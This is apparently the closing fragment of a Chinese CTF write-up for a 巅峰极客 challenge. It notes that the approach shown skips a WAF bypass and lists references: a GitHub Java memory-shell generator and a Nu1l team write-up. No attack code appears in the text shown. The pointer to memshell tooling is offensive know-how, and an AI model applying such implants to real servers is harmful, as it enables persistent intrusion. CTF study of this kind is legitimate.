​![image-20240829040516-b8tkl2n](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-426187238dcb03ca31e2c3348e4c4486b5a31f48.png)​

当然，这并不是巅峰极客的正确解法，那还需要涉及绕过Waf的问题，这里就不谈了。

参考：
===

<https://github.com/pen4uin/java-memshell-generator>

Nu1l战队巅峰极客WP

‍

‍